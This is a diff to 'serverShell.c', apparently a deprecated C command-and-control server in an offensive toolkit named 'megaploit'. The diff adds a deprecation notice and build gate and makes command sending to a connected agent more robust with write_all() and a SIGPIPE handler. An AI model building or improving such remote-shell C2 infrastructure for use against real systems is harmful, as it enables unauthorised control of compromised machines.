@@ -41,7 +41,24 @@
  *  FIX 10: write() / recv() return values were not checked.
  *
  * == THIS SOURCE CODE IS OUTDATED AS OF THIS CURRENT COMMIT ==
+ *
+ * PROTOCOL INCOMPATIBILITY
+ * ------------------------
+ * The C agent (client/) now uses TLS + HMAC-SHA256 + AES-256-GCM.
+ * This file speaks raw plaintext TCP with no authentication.
+ * Building this file against the current C agent will result in connection
+ * failures.  Use the Python C2 (megaploit/server/) for all operations.
+ *
+ * This file is gated behind LEGACY_C_SERVER_ACKNOWLEDGED to prevent
+ * accidental production use.  Defining that macro means you understand
+ * that this server CANNOT be used with the modern C agent.
  */
+
+#ifndef LEGACY_C_SERVER_ACKNOWLEDGED
+#  error "serverShell.c is DEPRECATED and incompatible with the C agent. " \
+         "Use the Python C2 (megaploit/server/) instead. " \
+         "Define -DLEGACY_C_SERVER_ACKNOWLEDGED to build for reference only."
+#endif
 
 #include <stdio.h>
 #include <sys/types.h>
@@ -50,7 +67,25 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <errno.h>
+#include <signal.h>
 #include <arpa/inet.h>
+
+/* Write all bytes in buf to fd, retrying on short writes (EINTR / partial).
+ * Returns 0 on success, -1 on hard error.                                  */
+static int write_all(int fd, const char *buf, size_t n)
+{
+    size_t sent = 0;
+    while (sent < n) {
+        ssize_t w = write(fd, buf + sent, n - sent);
+        if (w < 0) {
+            if (errno == EINTR) continue;
+            return -1;
+        }
+        sent += (size_t)w;
+    }
+    return 0;
+}
 
 /* ── Configuration ─────────────────────────────────────────────────────── */
 /* May be overridden at compile time: gcc -DLISTEN_PORT=4444 ...             */
@@ -91,6 +126,10 @@ static ssize_t recv_full(int fd, char *buf, size_t bufsz)
 
 int main(void)
 {
+    /* Ignore SIGPIPE so that write() to a disconnected agent socket returns
+     * EPIPE rather than killing the server process silently.               */
+    signal(SIGPIPE, SIG_IGN);
+
     int                iSock, iSock_Client;
     char               buffer[1024];
     char               cResp[18384];
@@ -153,7 +192,8 @@ int main(void)
         size_t cmdLen = strlen(buffer);
         if (cmdLen == 0) continue;
 
-        if (write(iSock_Client, buffer, cmdLen) < 0) { /* FIX 10 */
+        /* FIX 9+10: use write_all() — handles partial writes and SIGPIPE  */
+        if (write_all(iSock_Client, buffer, cmdLen) < 0) {
             perror("write");
             break;
         }
